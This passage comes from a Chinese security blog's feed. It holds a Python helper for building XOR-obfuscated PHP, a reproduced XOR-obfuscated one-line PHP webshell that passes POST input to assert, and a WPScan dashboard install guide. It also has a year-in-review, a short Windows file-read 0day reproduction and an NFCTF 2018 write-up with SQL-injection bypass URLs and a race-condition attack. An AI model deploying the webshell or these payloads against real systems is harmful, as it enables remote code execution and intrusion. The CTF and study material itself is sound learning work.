class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br>str1_AScII = range(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>)<br>str2_AScII = range(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>)<br>result_ASCII = range(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>)<br>print(<span class="hljs-string">"[-] Waiting for create the dicts..."</span>)<br>dict_key = []<br>dict_value = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str1_AScII:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> str2_AScII:<br>        <span class="hljs-keyword">if</span> i ^ j <span class="hljs-keyword">in</span> result_ASCII:<br>            dict_key.append((i, j, chr(i), chr(j)))<br>            dict_value.append(chr(i ^ j))<br><br>dicts = dict(zip(dict_key, dict_value))<br>print(<span class="hljs-string">"[+] OK,The dicts is create"</span>)<br><br>YourStr = input(<span class="hljs-string">"[-] Enter the string to be XORed: "</span>)<br>print(<span class="hljs-string">"\n[-] YourStr is : %s\n"</span> % (YourStr))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> YourStr:<br>    count = <span class="hljs-number">5</span><br>    print(<span class="hljs-string">"============ "</span> + <span class="hljs-string">"["</span> + i + <span class="hljs-string">"]"</span> + <span class="hljs-string">" Can following composition ========"</span>)<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> dicts.items():<br>        <span class="hljs-keyword">if</span> count != <span class="hljs-number">0</span>: <span class="hljs-comment"># 只遍历输出前五个异或结果</span><br>            <span class="hljs-keyword">if</span> v == <span class="hljs-string">"%s"</span> % i:<br>                <span class="hljs-keyword">if</span> (k[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> result_ASCII) <span class="hljs-keyword">and</span> (k[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> result_ASCII):<br>                    print(<span class="hljs-string">'"%s" ^ "%s"'</span> % (k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>]))<br>                    count -= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1A5ihavWG3KVjSZFg762TspXa6.png"></p><p>然后开始看着轮子造轮子。</p><p>然而，想造个好点的轮子，php太菜了弄了半天没弄出来，就弄了个最简单的一句话<code>xor</code> （晕）。。。。。。。</p><p>这里有个bug，拿九世表哥的造的小马，在本地环境上居然跑不起来，PHP直接是报错的。。。从此对php的好感又降了一级。 :P不知道是不是环境的问题，等后面再看了。</p><p>附上九世表哥的：</p><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$_0 = (<span class="hljs-string">"!"</span>^<span class="hljs-string">"@"</span>).(<span class="hljs-string">"3"</span>^<span class="hljs-string">"@"</span>).(<span class="hljs-string">"3"</span>^<span class="hljs-string">"@"</span>).(<span class="hljs-string">"%"</span>^<span class="hljs-string">"@"</span>).(<span class="hljs-string">"2"</span>^<span class="hljs-string">"@"</span>).(<span class="hljs-string">"4"</span>^<span class="hljs-string">"@"</span>); <span class="hljs-comment">/*assert*/</span><br>$_1 = <span class="hljs-string">'_'</span>.(hex2bin(<span class="hljs-string">"10"</span>)^<span class="hljs-string">"@"</span>).(hex2bin(<span class="hljs-string">"0F"</span>)^<span class="hljs-string">"@"</span>).(hex2bin(<span class="hljs-string">"13"</span>)^<span class="hljs-string">"@"</span>).(hex2bin(<span class="hljs-string">"14"</span>)^<span class="hljs-string">"@"</span>);<br>$_2 = $$_1;<br>$_0($_2[_]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WPScan Web Interface</title>
      <link href="/posts/1dd3590f.html"/>
      <url>/posts/1dd3590f.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1NR5jaECF3KVjSZJnq6znHFXa0.jpg"></p><a id="more"></a><p>该工具作者对 WPScan Web Interface 功能描述如下：</p><blockquote><p>用于运行和调度由wpscan实用程序提供支持的WordPress扫描的集中式仪表板。它具有以下功能：<br><strong>1、登录页面 -</strong><br>访问应用程序需要身份验证。<br><strong>2、仪表板页面 -</strong><br>按需扫描：通过提供URL或文本文件立即运行扫描，该URL具有由新行分隔的多个URL作为输入。<br>扫描历史记录：查看或删除扫描历史记录和报告。<br>计划扫描：将扫描配置为自动运行，或者像Linux中的cron作业一样定期运行。<br>预设扫描历史记录：编辑cron规则或删除任何预定扫描。<br><strong>3、报告页面-</strong><br>查看或打印扫描完成后发现的漏洞的详细信息。</p></blockquote><p>详细请转到 <a href="https://github.com/cyc10n3/WPScan_Web_Interface/blob/master/README.md" target="_blank" rel="noopener">https://github.com/cyc10n3/WPScan_Web_Interface/blob/master/README.md</a></p><p>以下是我安装环境：</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">OS：Parrot x86_64 GNU/Linux（基于Debian）<br>nodejs：v8.11.2<br>npm：5.8.0<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1KJl_Xkxz61VjSZFr760eLFXaS.png"></p><p>由于我所用的系统没有 <code>npm</code> 所以执行以下命令进行安装：</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install npm<br></code></pre></td></tr></table></figure><p>使用Git下载 <code>WPScan Web Interface</code> 到本地进行安装</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/cyc10n3/WPScan_Web_Interface.git<br><br>$ <span class="hljs-built_in">cd</span> WPScan_Web_Interface<br><br>$ sudo npm install<br><br>$ sudo npm start<br></code></pre></td></tr></table></figure><p>浏览器打开 <a href="https://localhost:1337，默认用户密码为：`admin/cyc10n3`">https://localhost:1337，默认用户密码为：`admin/cyc10n3`</a> 可在该工具文件夹下的<code>config.json</code> 修改密码。</p><p><img src="https://ae01.alicdn.com/kf/HTB14TWpaBCw3KVjSZFl763JkFXaC.png"></p><p><strong>登录页面</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB1gDWpaBCw3KVjSZFl763JkFXak.png"></p><p><strong>主页面–Scan</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB15mOiav1H3KVjSZFH762KppXa7.png"></p><p><strong>定时扫描</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB1OLSsarus3KVjSZKb760qkFXaS.png"></p><p><strong>扫描结果</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB1tKekaA9E3KVjSZFG76319XXai.png"></p><p><strong>后台状态</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB16FmjawaH3KVjSZFj763FWpXao.png"></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> wpscan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>挥手2018</title>
      <link href="/posts/b45532db.html"/>
      <url>/posts/b45532db.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1tlmcaB1D3KVjSZFy762uFpXaE.png"></p><a id="more"></a><div class="yinyue" style="text-align:center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=760058&auto=1&height=66"></iframe></div><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>2018应该是我目前所接触到的东西最多的一年，也是大学生活最后的一年。</p><p>回顾这一年，有太多已经记不清楚了(也有可能是在学校太无聊鼓噪了，不想记吧，呵呵)。</p></blockquote><p><strong><font color="#1bcc7c" size="5">唔</font>，在2018，提交了人生第一个漏洞、第一次拿到漏洞赏金(虽然只是金币)、第一次参加CTF线下比赛，第一次组队搞事情。。。。</strong></p><h2 id="第一次组队搞事情-凉了"><a href="#第一次组队搞事情-凉了" class="headerlink" title="第一次组队搞事情(凉了)"></a>第一次组队搞事情(凉了)</h2><p>2017年12底，同学约我组队一起开发一个使用PHP原生写的给教育行业用的评估系统。当时我就纳闷了，我又不会PHP，找我能做什么？原来是要我负责这系统安全方面检测之类的，有空的话现学PHP再帮写些简单的功能(晕，这太看得起我了吧)。之后自己想了想，这可以尝试尝试，反正又没什么，就当历练历练。</p><p>过了一周那样子，为了不影响写代码，我们在创客城申请了个地方用来开发。这个项目其实是中科院的一位博士提出来的并且给我们思路，让我们实现这套系统的，所以，在我们申请创客城”孵化计划”很快就通过了初试，最终能不能进去”孵化计划”还要一个月后才有通知。但，我们已经可待在创客城的办公区就行开发了，工牌，工位什么的都已经安排好了。</p><p>之后的每周只要没课，每天7点出校门赶去10公里开外的”办公地点”。就这样大概持续了大概半个月，学校也开始放假了，也就暂时放下了改项目。过了段时间，团队里有人要退出，而且创客城那边最终结果好像没用通过。最后这项目也就这样的结束了。</p><h2 id="考证"><a href="#考证" class="headerlink" title="考证"></a>考证</h2><p>3月底报考［信息安全工程师］，只是报名了，没有再去报培训班之类的，然后在近两个月的时间里，只是自己找相关的资料进行简单的复习。</p><p>5月底的信息安全工程师考证，出题机构换了，考得甚是糟糕(跟直接裸考差不多那样子了)。上下午题都是只拿了三十多分那样子。明年在看情况是否再继续报考吧。</p><h2 id="铁三区赛"><a href="#铁三区赛" class="headerlink" title="铁三区赛"></a>铁三区赛</h2><p>5月中旬，和学弟们一起参加了信息安全铁人三项赛区赛，”意外”的收获了第二名。当初去的时候，我们去都是抱着:名次不重要，就当出来观战观战，散散心。而，最终结果连我们自己也很意外，我们居然打到第二名了。其实整个比赛下来，都主要是靠学弟，对于第一次玩这线下CTF的我，就只算是划水了。</p><h2 id="初次实习"><a href="#初次实习" class="headerlink" title="初次实习"></a>初次实习</h2><p>渐渐的就到暑假了，又到了无趣的假期了，想出去提前接触下以后工作是什么样的，于是暑假的时候就找了个公司进行实习。本来想找个渗透测试的实习岗位的，但公司没有专门做渗透测试的，该公司是绿盟科技的代理商，主要负责政府部门、国企等相关的安服工作。唯一与渗透测试相关，靠近的也就 网络安全工程师(其实都是做安服工作的，不怎么区分)? 这个实习岗位了。后面也懒得去找其他的公司了，所以也就留下来了。</p><p>在公司，有的时很闲，有的时又很忙。闲的时候就做自己的喜欢的，比如，打打本地靶机，逛逛技术博客，学习学习新技术之类的。忙的时候，每天都跟师傅或者自己一人在客户之间跑来跑去的处理相关的安服工作。暑假在公司上班，时间过得飞快，转眼间就到9月底了，月底了，也到了离开的时候了。</p><p>12月，是个比赛繁忙的月，印象最深的两场比赛。</p><h2 id="铁三总决赛"><a href="#铁三总决赛" class="headerlink" title="铁三总决赛"></a>铁三总决赛</h2><p>月初，信息安全铁人三项总决赛在北航举办。天气是那么冷～南方人去到北方甚是难受，战力直接减半了。各个高校齐聚一堂与北航一争高下。总决赛，和区赛模式一样，分数据赛，企业赛还有个人挑战赛，每组的靶机独立的，互不影响。经过了8 个小时的PK，东道主北航夺冠了，山东科技大学，淮海工学院分别为亚军和季军。而我们也成功得到了三。。。。</p><h2 id="NNCTF"><a href="#NNCTF" class="headerlink" title="NNCTF"></a>NNCTF</h2><p>12月中旬，难受的两天NNCTF初赛，丧心病狂的晚上12点开赛，而且还弄个一血制。。。前20名的队伍可以晋级，另外线下决赛邀请10支队伍。比赛这两天的都是醒来就直接抱起电脑开撸的那种。第一天还是能保持前十的，第二天实在撸不动，排名也慢慢被挤下十几名来了，随缘吧，反正也进去二十了。线上赛准备结束了，直接呗甩到二十之外了。后面我们队就成了线下决赛邀请10队中的其中一支队伍。</p><p>线下赛30台自由靶机，AWD攻防模式。这中模式我们队的都没玩过，决赛被虐得惨惨的 (:</p><p>其中，也get到了很多新姿势。特别是线上赛的时候，线下决赛都没有的紧张感，居然在NNCTF线上赛时压迫感贼强。(?_?)</p><h2 id="写到最后"><a href="#写到最后" class="headerlink" title="写到最后"></a>写到最后</h2><p>今天是用来告别的，要完成什么什么之类的Flag就不立了。</p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows任意文件读取0day复现</title>
      <link href="/posts/db84c847.html"/>
      <url>/posts/db84c847.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB103ykaBaE3KVjSZLeq6xsSFXaX.jpg"></p><a id="more"></a><blockquote><p><font color="#1bcc7c" size="7">前言</font></p></blockquote><blockquote><p>最近国外安全研究员 SandboxEscaper又一次在推特上公布了新的Windows 0 day漏洞细节及PoC。此次披露的漏洞可造成任意文件读取。该漏洞可允许低权限用户或恶意程序读取目标Windows主机上任意文件的内容，但不可对文件进行写入操作。所有windows系列都将受此漏洞影响。</p></blockquote><p>一个普通用户 <code>read</code> 正常情况下是不能访问其他用户的家目录的。</p><p><img src="https://ae01.alicdn.com/kf/HTB10MykaBaE3KVjSZLe760sSFXaZ.png"></p><p>以下使用 <code>SandboxEscaper</code> 大牛公布的PoC可以绕过并成功读取另外一个用户在桌面上的文件。</p><p><img src="https://ae01.alicdn.com/kf/HTB1puysarys3KVjSZFn760FzpXah.png"></p><p>成功读取txt文件</p><p><img src="https://ae01.alicdn.com/kf/HTB10wykaBaE3KVjSZLe760sSFXaX.png"></p><p>大牛的博客以及PoC地址：</p><blockquote><p><a href="https://sandboxescaper.blogspot.com/2018/12/readfile-0day.html" target="_blank" rel="noopener">https://sandboxescaper.blogspot.com/2018/12/readfile-0day.html</a></p></blockquote><p>复现参考链接：</p><blockquote><p><a href="https://thehackernews.com/2018/12/windows-zero-day-exploit.html" target="_blank" rel="noopener">https://thehackernews.com/2018/12/windows-zero-day-exploit.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> vuln </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NNCTF-2018(部分)</title>
      <link href="/posts/1137788d.html"/>
      <url>/posts/1137788d.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1zQOhav1G3KVjSZFkq6yK4XXaK.jpg"></p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB:"></a>WEB:</h2><h3 id="超简单的web题"><a href="#超简单的web题" class="headerlink" title="超简单的web题"></a>超简单的web题</h3><p>直接截断拿到flag</p><figure class="hljs highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">http:<span class="hljs-regexp">//gxnnctf.gxsosec.cn:12311/</span>?<span class="hljs-literal">no</span>=<span class="hljs-number">1</span>%<span class="hljs-number">00</span>-<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1y.mkaBiE3KVjSZFM762QhVXa5.png"></p><h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli???"></a>Sqli???</h3><p>看看这边<code>/.git/</code>返回403 感觉存在<code>git漏洞</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1n1mjav1H3KVjSZFH762KppXaI.png"></p><p>随后用python恢复一下git文件恢复。</p><p><img src="https://ae01.alicdn.com/kf/HTB1vWOkaEKF3KVjSZFE760ExFXau.png"></p><p>可以看到验证了git文件泄露的存在， 跑出来一个<code>index.php </code></p><p><img src="https://ae01.alicdn.com/kf/HTB1v_mjav5G3KVjSZPx762I3XXat.png"></p><p>对<code>index.php</code>代码审计</p><p><img src="https://ae01.alicdn.com/kf/HTB1zOKqaBCw3KVjSZR0762cUpXay.png"></p><p><code>if($username === &#39;guest&#39;){    if($username === &#39;admin&#39;){ </code> </p><p>条件是两个查询 一个是<code>guest </code>一个是<code>admin</code> 可见可能是利用条件语句来查询数据库。</p><p><code>if(preg_match(&#39;#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is&#39;,$ip)){</code></p><p>以上也可见过滤了括号等等。</p><p>Sql绕过</p><p>看源码感觉是第一次查询为<code>guest</code>第二次查询为<code>admin</code><br>那我们是不是可以使用<code>mysql</code>的变量绕过这个，第一次查询变量值为<code>1</code>，第二次变量查询值为<code>2</code> ，可以想到使用<code>case when @x is null then @x:=2 ELSE @x:=1</code>。<br>执行同样的语句，第一次为<code>guest</code></p><p><img src="https://ae01.alicdn.com/kf/HTB12r5kavWG3KVjSZPc762kbXXan.png"></p><p>第二次变量赋值为<code>x=1</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1ljClaCSD3KVjSZFK76210VXal.png"></p><figure class="hljs highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">http://gxnnctf.gxsosec.cn:<span class="hljs-number">12312</span>/index.php?backdoor=Melonrind&amp;id=case<span class="hljs-symbol">%20</span>when<span class="hljs-symbol">%20</span><span class="hljs-title">@x</span><span class="hljs-symbol">%20</span>IS<span class="hljs-symbol">%20</span>NULL<span class="hljs-symbol">%20</span>THEN<span class="hljs-symbol">%20</span><span class="hljs-title">@x</span>:=<span class="hljs-number">2</span><span class="hljs-symbol">%20</span>ELSE<span class="hljs-symbol">%20</span><span class="hljs-title">@x</span>:=<span class="hljs-number">1</span><span class="hljs-symbol">%20</span><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1kJekaEGF3KVjSZFm762qPXXal.png"></p><h2 id="白帽子商城"><a href="#白帽子商城" class="headerlink" title="白帽子商城"></a>白帽子商城</h2><p>分析：注册新账号，初始金额1000刀，要购买帽子，一级帽子500刀，购买成功则提升一级，帽子的价格也随之上调1$.购买第一个帽子后，就发现余额不足以继续购买了.</p><p><img src="https://ae01.alicdn.com/kf/HTB1kK1kaECF3KVjSZJn762nHFXaD.png"></p><p>重新注册个新账号，尝试条件竞争，打开burp，点击购买，抓取数据</p><p><img src="https://ae01.alicdn.com/kf/HTB18EKjavWG3KVjSZFg762TspXax.png"></p><p>发送到Intruder，点击Positions，点击clea，点击Payload，选择类型为Null，调大线程和发送次数</p><p><img src="https://ae01.alicdn.com/kf/HTB1.ZqlaA5E3KVjSZFC762uzXXaX.png"></p><p><img src="https://ae01.alicdn.com/kf/HTB1uLOjaxiH3KVjSZPf760BiVXai.png"></p><p>发现竞争失败。</p><p>后面测试，发现修改【order】的参数可以免费购买帽子，但是始终绕不过购买第二个帽子<br>于是，猜想这里应该存在条件竞争，那再新注册个账号，修改数据先达到购买第二个帽子的页面，这里使用脚本来登录两个会话同时进行购买帽子</p><p><img src="https://ae01.alicdn.com/kf/HTB1wJqkaEWF3KVjSZPh760clXXaI.png"></p><p><img src="https://ae01.alicdn.com/kf/HTB1a6KlaCSD3KVjSZFK76210VXax.png"></p><p>使用脚本同时购买第二个帽子</p><p><img src="https://ae01.alicdn.com/kf/HTB1Ob9laBGE3KVjSZFh763kaFXal.png"></p><p>刷新浏览器，已经get到flag</p><p><img src="https://ae01.alicdn.com/kf/HTB127alaBOD3KVjSZFF763n9pXay.png"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC:"></a>MISC:</h2><h3 id="这是啥"><a href="#这是啥" class="headerlink" title="这是啥"></a>这是啥</h3><p>尝试了栅栏密码和凯撒密码，发现有点像凯撒密码</p><p><img src="https://ae01.alicdn.com/kf/HTB1xaGtaqWs3KVjSZFx761WUXXaF.png"></p><p>GFE-YLCERCNSNLA-AIX{N-PYNET-TSTMYRA}<br>把上面这一串分为6组6个字符串</p><figure class="hljs highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">GFE-<span class="hljs-built_in">YL</span><br>CERCNS<br>NLA-AI<br><span class="hljs-built_in">X</span>&#123;N-PY<br>NET-TS<br>TMYRA&#125;<br></code></pre></td></tr></table></figure><p>每组按照<code>143526</code>的顺序排序，最后拿到flag</p><figure class="hljs highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">GXNNCT</span> F&#123;<span class="hljs-attribute">LEEM</span> ENATRY ----CR YPATNA LYISS&#125;<br></code></pre></td></tr></table></figure><h3 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h3><p>分析：</p><p>解压下载的压缩包，发现里面有<code>40个flag.zip</code>包，并且每个压缩包文件都有3个字节大小的名为<code>flag.txt</code>的文件。那就尝试<code>crc32</code>碰撞看看能不能还原压缩包里面的内容。</p><p><img src="https://ae01.alicdn.com/kf/HTB1YmGjav5G3KVjSZPx762I3XXa0.png"></p><p>从网上搜索一波，看看有没有相似的，于是找到一遍文章<code>https://www.cnblogs.com/WangAoBo/p/6951160.html</code>，直接拿现成脚本代码来跑。</p><p><img src="https://ae01.alicdn.com/kf/HTB1Q0ikaEWF3KVjSZPh760clXXaF.png"></p><p>这里坑啊，跑了半天什么都没跑出来。后来仔细审了下该脚本，脚本里的CrackCrc()有<code>4个for循环</code>，对应的应该是压缩包里的大小为<code>4</code>个字节的文件，但是现有的压缩包大小是<code>3</code>个字节，于是修改下代码去掉一个for循环， 最终脚本，如下：</p><p><img src="https://ae01.alicdn.com/kf/HTB1VbytaqSs3KVjSZPi763siVXaU.png"></p><p><img src="https://ae01.alicdn.com/kf/HTB1L5CqaBCw3KVjSZR0762cUpXah.png"></p><p>What，这是什么啊，新手的我一脸懵逼。后面baidu、Google了一波，原来这个是ASCII码，把ASCII转换成对应的字符串，然后再base64解码即可。</p><p><img src="https://ae01.alicdn.com/kf/HTB1HcymaBSD3KVjSZFq7634bpXav.png"></p><h3 id="太简单了"><a href="#太简单了" class="headerlink" title="太简单了"></a>太简单了</h3><p>解压压缩包，里面这有个没有尾缀名的<code>flag</code>文件，老规矩，<code>file</code>一下看看是什么文件，是个<code>zip</code>压缩包，直接加上为尾缀名，解压</p><p><img src="https://ae01.alicdn.com/kf/HTB1Jn5laBWD3KVjSZKP761p7FXaW.png"></p><p>解压不了，提示文件损坏。直接扔winhex，发现文件头被改了，直接改回来</p><p><img src="https://ae01.alicdn.com/kf/HTB1iSX_Xkxz61VjSZFr760eLFXaJ.png"></p><h3 id="Txt"><a href="#Txt" class="headerlink" title="Txt:"></a>Txt:</h3><p>下载下来是一个txt文件，但是复制的时候好像有点问题</p><p>打开winhex下查看，发现隐藏了一些东西。</p><p>谷歌zero-width，找到原题：</p><p><code>https://rawsec.ml/en/HackIT-2018-write-ups/</code></p><p><img src="https://ae01.alicdn.com/kf/HTB10ECkaBiE3KVjSZFM762QhVXao.png"></p><p>在wirteup部分找到解密的链接，复制文本里的内容直接解密得到flag</p><p><code>https://offdev.net/demos/zwsp-steg-js</code></p><p><img src="https://ae01.alicdn.com/kf/HTB12ZmkaEGF3KVjSZFm762qPXXa7.png"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><blockquote><p>格式化字符串盲打 通过printf的函数地址确定libc基址，从而获得system地址。<br>send字符串“/bin/sh;”，那么在调用printf(“/bin/sh;”)的时候实际上调用的是system(“/bin/sh;”)，<br>通过格式化字符串漏洞达到任意读和任意写功能通过使其泄露信息从而实现目的。</p></blockquote><p><img src="https://ae01.alicdn.com/kf/HTB1aYOmaBSD3KVjSZFq7634bpXaT.png"></p><p><img src="https://ae01.alicdn.com/kf/HTB1Vy1kaEGF3KVjSZFv762_nXXaI.png"></p><h2 id="MOBILE"><a href="#MOBILE" class="headerlink" title="MOBILE"></a>MOBILE</h2><h3 id="IOS-200"><a href="#IOS-200" class="headerlink" title="IOS_200"></a>IOS_200</h3><blockquote><p>题目描述：IOS送分题</p></blockquote><p>压缩包下载下来解压，先file一下看看，发现里面的【UnlockMyIphone】是64位的app文件。</p><p><img src="https://ae01.alicdn.com/kf/HTB1wnmjav5G3KVjSZPx762I3XXaS.png"></p><p>直接扔进IDA，搜索一波flag，key之类的关键字，搜到一串私钥，仔细看，发现这是不需要密钥就可以解密的。</p><p><img src="https://ae01.alicdn.com/kf/HTB19RR_Xkxz61VjSZFt761DSVXaJ.png"></p><p>私钥后面跟着两串类似加密的字符串，不管那多，把私钥和这两串文本复制出来先。</p><p><img src="https://ae01.alicdn.com/kf/HTB1FHSqaBGw3KVjSZFw762Q2FXae.png" alt="0x31.png"></p><p>百度 在线rsa加密解密，找到以下站点进行解密（这里好像有个小坑，百度出来的前三个站点解不了，不知什么情况）</p><p><img src="https://ae01.alicdn.com/kf/HTB1HuyqaBKw3KVjSZFO761rDVXaT.png"></p><h2 id="BASIC"><a href="#BASIC" class="headerlink" title="BASIC:###"></a>BASIC:###</h2><h3 id="Her-Majesty-Queen-Elizabeth-II："><a href="#Her-Majesty-Queen-Elizabeth-II：" class="headerlink" title="Her Majesty Queen Elizabeth II：###"></a>Her Majesty Queen Elizabeth II：###</h3><figure class="hljs highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">FE&amp;pd8dMFLR%)(DsGbhi@/dKPNR<span class="hljs-string">'*TUm?\tlr.7RV</span><br></code></pre></td></tr></table></figure><p>直接base92解码拿到flag</p><p><img src="https://ae01.alicdn.com/kf/HTB14vKqaBKw3KVjSZTE763uRpXaK.png"></p><h2 id="真—签到题："><a href="#真—签到题：" class="headerlink" title="真—签到题：##"></a>真—签到题：##</h2><p>关注公众号拿flag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto:"></a>Crypto:</h2><h3 id="维吉尼亚遇上困难："><a href="#维吉尼亚遇上困难：" class="headerlink" title="维吉尼亚遇上困难：###"></a>维吉尼亚遇上困难：###</h3><p>这一段应该是维吉尼亚密码</p><figure class="hljs highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">BZGTNPMMCGZFPUWJCUIGRWXPFNLHZCKOAPGLKYJNRAQFIUYRAVGNPANUMDQOAHMWTGJDXGOMPJPTKAAVZIUIWKVTUCWBWNFWDFUMPJWPMQGPTNWXTSDPLPMWJAXUHHXWPFXXGVAPFNTXVFKOYIRBOQJHCBVWVFYCGQFGUSUBDWVIYATJGTBNDKGHCTMTWIUEFJITVUGJHHIMUVJICUWYQWYGGUWPUUCWIFGWUANILKPHDKOSPJTTWJQOJHXLBJAPZHVQWPDYPGLLGDBCHTGIZCCMEGVIIJLIFFBHSMEGUJHRXBOQUBDNASPEUCWNGWSNWXTSDPLPMWJAIUHUMWPSYCTUWFBMIAMKVBNTDMQNBVDKILQSSDYVWVXIGDQFIBHSLEAVDBXGOLGDBCHTGIZVNFQFKTNGRWXUDCTGKWCOXIXKZPPFDZGXNBAXLGGWBLTLWCKOXAR</span><br><span class="hljs-keyword">`</span><br></code></pre></td></tr></table></figure><p>直接搜索找到解密网址</p><p><code>https://guballa.de/vigenere-solver</code></p><p><img src="https://ae01.alicdn.com/kf/Hfe537524fb7747ab9da36207a896ceedj.png"></p><h3 id="Shamir重要数据损坏"><a href="#Shamir重要数据损坏" class="headerlink" title="Shamir重要数据损坏"></a>Shamir重要数据损坏</h3><blockquote><p>某集团总裁Shamir将自己使用的笔记本电脑上重要的秘密数据分割成5份子秘密数据，并分别存放在5个存储设备上，其中可以由至少3份子秘密数据联合参与运算，才能重构原来的秘密数据。分割方案使用的参数模数为5987。由于Shamir使用的笔记本电脑感染病毒致使该重要秘密数据损坏无法修复，于是Shamir让技术人员通过存放在编号为5、7、9的三个存储设备的子秘密数据进行重构重要秘密数据，其中编号5的存储设备存放的数据为（5,2258）、编号为7的存储设备存放的数据为（7,2424）、编号为9的存储设备存放的数据为（9,2630）。请问技术人员重构出来的重要秘密数据是多少？</p></blockquote><figure class="hljs highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 